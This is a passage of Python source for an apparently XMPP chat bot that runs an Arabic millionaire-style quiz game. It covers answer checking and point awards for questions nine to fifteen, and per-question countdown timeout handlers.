           sual9 = random.choice(Question9['m'].keys()) 
           hear9 = ''.join(Question9['m'][sual9].keys())  
           guab9 = ''.join(Question9['m'][sual9][hear9].keys()) 
           new9 = Question9['m'][sual9][hear9][guab9]	
           Game_Bot1[s[1]][jid]['9t']=new9		   
           Game_Bot1[s[1]][jid]['9']=guab9
           Game_Bot1[s[1]][jid]['9s']=sual9
           Game_Bot1[s[1]][jid]['9h']=hear9	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual9x = ''.join(Game_Bot1[s[1]][jid]['9s'])
           hear9x = ''.join(Game_Bot1[s[1]][jid]['9h'])		   
           msg(s[3],s[1], StArT_Game[8]%(sual9x,hear9x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty9(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==10 and Melody_Game['melody'][s[1]][jid]['c']==8:	
            del START1[s[1]]			
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال التاسع
         if Melody_Game['melody'][s[1]][jid]['a']==10 and Melody_Game['melody'][s[1]][jid]['c']==9: 
          guab9x = ''.join(Game_Bot1[s[1]][jid]['9'])
          hear9x = ''.join(Game_Bot1[s[1]][jid]['9h'])	
          agabat9 = ''.join(Game_Bot1[s[1]][jid]['9t'])				  
          if p == guab9x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[31])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[56])  	
           Game_Bot['rsed'][jid]="16000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto9(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]:
           msg(s[3],s[1],StArT_Game[21]% agabat9)		
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear9x: pass		   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[55])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="1000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	
		   
         #10  متابعة السوال العاشر
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==11 and Melody_Game['melody'][s[1]][jid]['c']==9:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual10 = random.choice(Question10['m'].keys()) 
           hear10 = ''.join(Question10['m'][sual10].keys())  
           guab10 = ''.join(Question10['m'][sual10][hear10].keys())   
           new10 = Question10['m'][sual10][hear10][guab10]	
           Game_Bot1[s[1]][jid]['10t']=new10		   
           Game_Bot1[s[1]][jid]['10']=guab10
           Game_Bot1[s[1]][jid]['10s']=sual10
           Game_Bot1[s[1]][jid]['10h']=hear10	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual10x = ''.join(Game_Bot1[s[1]][jid]['10s'])
           hear10x = ''.join(Game_Bot1[s[1]][jid]['10h'])		   
           msg(s[3],s[1], StArT_Game[9]%(sual10x,hear10x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty10(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==11 and Melody_Game['melody'][s[1]][jid]['c']==9:	
            del START1[s[1]]			
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال العاشر
         if Melody_Game['melody'][s[1]][jid]['a']==11 and Melody_Game['melody'][s[1]][jid]['c']==10: 
          guab10x = ''.join(Game_Bot1[s[1]][jid]['10'])
          hear10x = ''.join(Game_Bot1[s[1]][jid]['10h']) 
          agabat10 = ''.join(Game_Bot1[s[1]][jid]['10t'])		  
          if p == guab10x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[32])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[58])  	
           Game_Bot['rsed'][jid]="32000"   
           Game_Bot['sapt'][jid]="32000" 		   
           write_file(Game_Bot_FILE, str(Game_Bot)) 
           stop_game_auto10(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]:
           msg(s[3],s[1],StArT_Game[21]% agabat10)		
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear10x: pass			   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[57])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="1000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 	
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	
		   
         #11  متابعة السوال الحادي عشر
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==12 and Melody_Game['melody'][s[1]][jid]['c']==10:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual11 = random.choice(Question11['m'].keys()) 
           hear11 = ''.join(Question11['m'][sual11].keys())  
           guab11 = ''.join(Question11['m'][sual11][hear11].keys()) 
           new11 = Question11['m'][sual11][hear11][guab11]	
           Game_Bot1[s[1]][jid]['11t']=new11		   
           Game_Bot1[s[1]][jid]['11']=guab11
           Game_Bot1[s[1]][jid]['11s']=sual11
           Game_Bot1[s[1]][jid]['11h']=hear11	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual11x = ''.join(Game_Bot1[s[1]][jid]['11s'])
           hear11x = ''.join(Game_Bot1[s[1]][jid]['11h'])		   
           msg(s[3],s[1], StArT_Game[10]%(sual11x,hear11x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty11(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==12 and Melody_Game['melody'][s[1]][jid]['c']==10:	
            del START1[s[1]]			
            msg(s[3],s[1],StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال الحادي عشر
         if Melody_Game['melody'][s[1]][jid]['a']==12 and Melody_Game['melody'][s[1]][jid]['c']==11: 
          guab11x = ''.join(Game_Bot1[s[1]][jid]['11'])
          hear11x = ''.join(Game_Bot1[s[1]][jid]['11h'])  	
          agabat11 = ''.join(Game_Bot1[s[1]][jid]['11t'])		  
          if p == guab11x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[33])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[60])  	
           Game_Bot['rsed'][jid]="64000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto11(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat11)		
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear11x: pass			   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[59])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="32000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 			   
           del START1[s[1]] 	
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	
		   
         #12 متابعة السوال الثاني عشر
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==13 and Melody_Game['melody'][s[1]][jid]['c']==11:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual12 = random.choice(Question12['m'].keys()) 
           hear12 = ''.join(Question12['m'][sual12].keys())  
           guab12 = ''.join(Question12['m'][sual12][hear12].keys())  	
           new12 = Question12['m'][sual12][hear12][guab12]	
           Game_Bot1[s[1]][jid]['12t']=new12		   
           Game_Bot1[s[1]][jid]['12']=guab12
           Game_Bot1[s[1]][jid]['12s']=sual12
           Game_Bot1[s[1]][jid]['12h']=hear12	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual12x = ''.join(Game_Bot1[s[1]][jid]['12s'])
           hear12x = ''.join(Game_Bot1[s[1]][jid]['12h'])		   
           msg(s[3],s[1], StArT_Game[11]%(sual12x,hear12x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty12(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==13 and Melody_Game['melody'][s[1]][jid]['c']==11:	
            del START1[s[1]]		
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال الثاني عشر
         if Melody_Game['melody'][s[1]][jid]['a']==13 and Melody_Game['melody'][s[1]][jid]['c']==12: 
          guab12x = ''.join(Game_Bot1[s[1]][jid]['12'])
          hear12x = ''.join(Game_Bot1[s[1]][jid]['12h'])
          agabat12 = ''.join(Game_Bot1[s[1]][jid]['12t']) 		  
          if p == guab12x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[34])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[62])  	
           Game_Bot['rsed'][jid]="125000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto12(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]: 
           msg(s[3],s[1],StArT_Game[21]% agabat12)		
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear12x: pass			   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[61])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="32000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		   
           del START1[s[1]] 	
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 			   
         #13  متابعة السوال الثالث عشر
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==14 and Melody_Game['melody'][s[1]][jid]['c']==12:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual13 = random.choice(Question13['m'].keys()) 
           hear13 = ''.join(Question13['m'][sual13].keys())  
           guab13 = ''.join(Question13['m'][sual13][hear13].keys()) 
           new13 = Question13['m'][sual13][hear13][guab13]	
           Game_Bot1[s[1]][jid]['13t']=new13			   
           Game_Bot1[s[1]][jid]['13']=guab13
           Game_Bot1[s[1]][jid]['13s']=sual13
           Game_Bot1[s[1]][jid]['13h']=hear13	
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual13x = ''.join(Game_Bot1[s[1]][jid]['13s'])
           hear13x = ''.join(Game_Bot1[s[1]][jid]['13h'])		   
           msg(s[3],s[1], StArT_Game[12]%(sual13x,hear13x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty13(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==14 and Melody_Game['melody'][s[1]][jid]['c']==12:	
            del START1[s[1]]			
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال الثالث عشر
         if Melody_Game['melody'][s[1]][jid]['a']==14 and Melody_Game['melody'][s[1]][jid]['c']==13: 
          guab13x = ''.join(Game_Bot1[s[1]][jid]['13'])
          hear13x = ''.join(Game_Bot1[s[1]][jid]['13h'])
          agabat13 = ''.join(Game_Bot1[s[1]][jid]['13t'])		  
          if p == guab13x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[35])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[64])  	
           Game_Bot['rsed'][jid]="250000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           stop_game_auto13(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]:
           msg(s[3],s[1],StArT_Game[21]% agabat13)			   
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear13x: pass		   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[63])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="32000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 			   
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	
		   
         #14 متابعة السوال الرابع عشر
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==15 and Melody_Game['melody'][s[1]][jid]['c']==13:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual14 = random.choice(Question14['m'].keys()) 
           hear14 = ''.join(Question14['m'][sual14].keys())  
           guab14 = ''.join(Question14['m'][sual14][hear14].keys())  	
           new14 = Question14['m'][sual14][hear14][guab14]	
           Game_Bot1[s[1]][jid]['14t']=new14		   
           Game_Bot1[s[1]][jid]['14']=guab14
           Game_Bot1[s[1]][jid]['14s']=sual14
           Game_Bot1[s[1]][jid]['14h']=hear14				   
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual14x = ''.join(Game_Bot1[s[1]][jid]['14s'])
           hear14x = ''.join(Game_Bot1[s[1]][jid]['14h'])		   
           msg(s[3],s[1], StArT_Game[13]%(sual14x,hear14x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty14(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==15 and Melody_Game['melody'][s[1]][jid]['c']==13:	
            del START1[s[1]]			
            msg(s[3],s[1], StArT_Game[18])    
            reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")			
         #سوال الرابع عشر
         if Melody_Game['melody'][s[1]][jid]['a']==15 and Melody_Game['melody'][s[1]][jid]['c']==14: 
          guab14x = ''.join(Game_Bot1[s[1]][jid]['14'])
          hear14x = ''.join(Game_Bot1[s[1]][jid]['14h']) 
          agabat14 = ''.join(Game_Bot1[s[1]][jid]['14t']) 		  
          if p == guab14x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[36])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[66])  	
           Game_Bot['rsed'][jid]="500000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 
           stop_game_auto14(s[3],s[1],jid,p) 			   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]:
           msg(s[3],s[1],StArT_Game[21]% agabat14)	
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear14x: pass		 		   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[65])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="32000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 		
           del START1[s[1]] 	
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	
		   
         #14 متابعة السوال الخامس عشر
         if StArT_Game[19] in p and Melody_Game['melody'][s[1]][jid]['a']==16 and Melody_Game['melody'][s[1]][jid]['c']==14:	
           Melody_Game['melody'][s[1]][jid]['g'] += 1	   
           write_file(Melody_Game_FILE, str(Melody_Game))		 
           time.sleep(2)    
           sual15 = random.choice(Question15['m'].keys()) 
           hear15 = ''.join(Question15['m'][sual15].keys())  
           guab15 = ''.join(Question15['m'][sual15][hear15].keys()) 
           new15 = Question15['m'][sual15][hear15][guab15]		   
           Game_Bot1[s[1]][jid]['15']=guab15
           Game_Bot1[s[1]][jid]['15s']=sual15
           Game_Bot1[s[1]][jid]['15h']=hear15
           Game_Bot1[s[1]][jid]['15t']=new15		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))	
           sual15x = ''.join(Game_Bot1[s[1]][jid]['15s'])
           hear15x = ''.join(Game_Bot1[s[1]][jid]['15h'])		   
           msg(s[3],s[1], StArT_Game[14]%(sual15x,hear15x))    
           Melody_Game['melody'][s[1]][jid]['c'] += 1  
           natoxty15(s[3],s[1],jid,p) 
           return  p	
         if StArT_Game[17] in p and Melody_Game['melody'][s[1]][jid]['a']==16 and Melody_Game['melody'][s[1]][jid]['c']==14:	
            del Game_Bot1[s[1]][jid]		   
            write_file(Game_Bot1_FILE, str(Game_Bot1))
            del Melody_Game['melody'][s[1]][jid]
            write_file(Melody_Game_FILE, str(Melody_Game))				
            msg(s[3],s[1], StArT_Game[18])    
			
         #سوال الخامس عشر
         if Melody_Game['melody'][s[1]][jid]['a']==16 and Melody_Game['melody'][s[1]][jid]['c']==15: 
          guab15x = ''.join(Game_Bot1[s[1]][jid]['15'])
          hear15x = ''.join(Game_Bot1[s[1]][jid]['15h'])	
          agabat15 = ''.join(Game_Bot1[s[1]][jid]['15t'])		  
          if p == guab15x:
           Melody_Game['melody'][s[1]][jid]['a'] += 1
           write_file(Melody_Game_FILE, str(Melody_Game))			   
           msg(s[3],s[1], StArT_Game[37])   
           time.sleep(2)  		   
           msg(s[3],s[1], StArT_Game[38])  	
           Game_Bot['rsed'][jid]="1000000"   
           Game_Bot['sapt'][jid]="1000000"  		   
           write_file(Game_Bot_FILE, str(Game_Bot)) 	
           del START1[s[1]]  
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))	   
           return  p
          elif p == StArT_Game[20] and Melody_Game['melody'][s[1]][jid]['son']==1: 
           msg(s[3],s[1],StArT_Game[22])		   
          elif p == StArT_Game[20]:
           msg(s[3],s[1],StArT_Game[21]% agabat15)		
           Melody_Game['melody'][s[1]][jid]['son'] += 1 		   
          elif p not in hear15x: pass			   
          else: 
           reply(t, s, s[2]+' : '+StArT_Game[67])  
           del Game_Bot1[s[1]][jid]		   
           write_file(Game_Bot1_FILE, str(Game_Bot1))
           del Melody_Game['melody'][s[1]][jid]
           write_file(Melody_Game_FILE, str(Melody_Game))
           Game_Bot['rsed'][jid]="32000"   
           write_file(Game_Bot_FILE, str(Game_Bot)) 
           del START1[s[1]] 
           reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")		   
           return 	 		   
		   
 else: return 


register_message_handler(handler_chat_message)	 




def natoxty(g,n,u,p):
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==2 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==2 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==2 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==2 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==2 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==2 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))		
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))  
   msg(g,n, Game_Time_out_R[0])  
   del START1[n]  
   msg(g,n, "تم اغلاق ملف اللعبة")   
 except: pass
 
def natoxty1(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==3 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==3 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==3 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==3 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==3 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==3 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	
   msg(g,n, Game_Time_out_R[1])	
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))   
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass
 
def natoxty2(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==4 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==4 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==4 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==4 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==4 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==4 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	
   msg(g,n, Game_Time_out_R[2])	
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty3(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==5 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==5 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==5 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==5 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==5 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==5 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[3])
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty5(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==6 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==6 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==6 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==6 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==6 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==6 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[4])
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty6(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==7 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==7 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==7 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==7 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==7 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==7 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[5])
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty7(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==8 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==8 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==8 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==8 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==8 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==8 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[6])
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty8(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==9 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==9 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==9 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==9 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==9 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==9 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[7])  
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))   
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty9(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==10 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==10 and n in START1: 
   msg(g,n, "4")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==10 and n in START1: 
   msg(g,n, "3")
  time.sleep(1)  
  if Melody_Game['melody'][n][u]['a']==10 and n in START1: 
   msg(g,n, "2")
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==10 and n in START1: 
   msg(g,n, "1") 
  time.sleep(1)   
  if Melody_Game['melody'][n][u]['a']==10 and n in START1:
   del Melody_Game['melody'][n][u]
   write_file(Melody_Game_FILE, str(Melody_Game))	 
   msg(g,n, Game_Time_out_R[8])  
   del Game_Bot1[n][u]  
   write_file(Game_Bot1_FILE, str(Game_Bot1))    
   del START1[n]   
   msg(g,n, "تم اغلاق ملف اللعبة")      
 except: pass   
   
def natoxty10(g,n,u,p):	
 try:
  time.sleep(Game_Time_out)
  if Melody_Game['melody'][n][u]['a']==11 and n in START1: 
   msg(g,n, "5")  
  time.sleep(1) 
  if Melody_Game['melody'][n][u]['a']==11 and n in START1: 
   msg(g,n, "4")
